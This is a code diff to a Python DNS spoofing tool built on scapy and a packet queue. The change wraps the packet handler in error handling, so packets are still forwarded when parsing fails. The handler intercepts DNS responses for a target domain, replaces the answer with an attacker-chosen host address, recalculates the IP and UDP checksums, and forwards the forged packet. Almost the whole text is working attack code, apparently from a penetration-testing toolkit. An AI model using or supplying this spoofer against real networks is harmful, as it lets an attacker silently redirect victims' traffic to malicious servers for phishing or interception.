@@ -59,33 +59,36 @@ class DNSSpoofer:
         self.host = host
 
     def process_packet(self, packet):
-        # Convert scapy_packet
-        scapy_packet = scapy.IP(packet.get_payload())
+        try:
+            # Convert scapy_packet
+            scapy_packet = scapy.IP(packet.get_payload())
 
-        # Check if the packet has a DNS Response layer
-        if scapy_packet.haslayer(scapy.DNSRR):
+            # Check if the packet has a DNS Response layer
+            if scapy_packet.haslayer(scapy.DNSRR):
 
-            # Capture the DNS request qname
-            qname = scapy_packet[scapy.DNSQR].qname
-            if self.domain.encode() in qname:
-                print(f"[+] Captured Traffic! Spoofing {scapy_packet[scapy.IP].src} to {self.host}.")
+                # Capture the DNS request qname
+                qname = scapy_packet[scapy.DNSQR].qname
+                if self.domain.encode() in qname:
+                    print(f"[+] Captured Traffic! Spoofing {scapy_packet[scapy.IP].src} to {self.host}.")
 
-                # Remove all other answers and save the spoofed answer
-                answer = scapy.DNSRR(rrname=qname, rdata=self.host)
-                scapy_packet[scapy.DNS].an = answer
-                scapy_packet[scapy.DNS].ancount = 1
+                    # Remove all other answers and save the spoofed answer
+                    answer = scapy.DNSRR(rrname=qname, rdata=self.host)
+                    scapy_packet[scapy.DNS].an = answer
+                    scapy_packet[scapy.DNS].ancount = 1
 
-                # Delete IP/UDP fields so they can be recalculated by scapy
-                del scapy_packet[scapy.IP].len
-                del scapy_packet[scapy.IP].chksum
-                del scapy_packet[scapy.UDP].len
-                del scapy_packet[scapy.UDP].chksum
+                    # Delete IP/UDP fields so they can be recalculated by scapy
+                    del scapy_packet[scapy.IP].len
+                    del scapy_packet[scapy.IP].chksum
+                    del scapy_packet[scapy.UDP].len
+                    del scapy_packet[scapy.UDP].chksum
 
-                # Set the new payload
-                packet.set_payload(bytes(scapy_packet))
-
-        # Forward off the packet through the queue
-        packet.accept()
+                    # Set the new payload
+                    packet.set_payload(bytes(scapy_packet))
+        except Exception as e:
+            print(f"[-] Error processing packet: {str(e)}")
+        finally:
+            # Forward off the packet through the queue
+            packet.accept()
 
 
 def main(args):
